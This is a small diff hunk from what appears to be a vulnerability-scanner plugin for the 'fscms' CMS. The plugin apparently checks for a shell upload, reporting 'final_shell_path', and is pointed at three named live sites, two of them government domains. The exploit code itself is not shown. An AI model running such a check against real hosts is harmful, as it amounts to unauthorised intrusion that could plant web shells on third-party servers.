@@ -103,7 +103,7 @@ Content-Disposition: form-data; name="Submit"
                 security_hole(final_shell_path)   
     
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('fscms', 'http://www.cre.cn/')[1])
     audit(assign('fscms', 'http://www.jznlw.gov.cn:8088/')[1])
     audit(assign('fscms', 'http://www.donation.gov.cn/')[1])
